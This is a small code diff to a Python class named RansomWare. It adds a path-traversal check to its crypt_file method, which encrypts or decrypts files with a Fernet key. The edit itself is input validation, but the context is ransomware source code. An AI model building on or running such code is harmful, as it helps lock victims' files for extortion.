@@ -92,6 +92,8 @@ class RansomWare:
 
     # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
     def crypt_file(self, file_path, encrypted=False):
+        if '../' in file_path or '..\\' in file_path:
+            raise Exception('Invalid file path')
         with open(file_path, 'rb') as f:
             # Read data from file
             data = f.read()
